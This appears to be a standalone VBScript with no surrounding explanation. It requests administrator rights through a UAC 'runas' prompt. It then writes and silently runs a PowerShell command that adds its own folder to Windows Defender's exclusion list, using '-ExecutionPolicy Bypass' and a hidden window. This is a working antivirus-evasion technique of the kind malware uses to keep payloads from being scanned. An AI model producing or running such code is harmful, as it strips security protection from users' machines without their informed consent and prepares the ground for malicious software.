Set WshShell = CreateObject("WScript.Shell")
Dim username
username = CreateObject("WScript.Network").UserName
Dim scriptPath
scriptPath = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
If WScript.Arguments.Count = 0 Then
  Set ObjShell = CreateObject("Shell.Application")
  ObjShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ Run", , "runas", 1
Else
  Set objFSO=CreateObject("Scripting.FileSystemObject")
  outFile= scriptPath & "addExclusion.ps1"
  Set objFile = objFSO.CreateTextFile(outFile,True)
  objFile.Write "Add-MpPreference -ExclusionPath """ & scriptPath & """"
  objFile.Close

  Dim cmd
  cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & outFile
  WshShell.Run cmd, 0
End If
